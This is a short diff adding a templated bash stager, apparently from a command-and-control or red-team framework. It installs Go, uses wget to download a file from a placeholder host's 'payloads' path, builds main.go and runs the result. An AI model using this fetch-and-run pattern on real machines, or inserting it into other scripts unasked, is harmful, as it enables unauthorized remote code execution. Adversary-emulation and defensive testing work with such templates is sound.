@@ -1,0 +1,5 @@
+#!/bin/bash
+sudo snap install --classic --channel=1.11/stable go
+wget {{.hostname}}/payloads/{{.filename}}
+go build main.go
+./{{.pathtofile}}
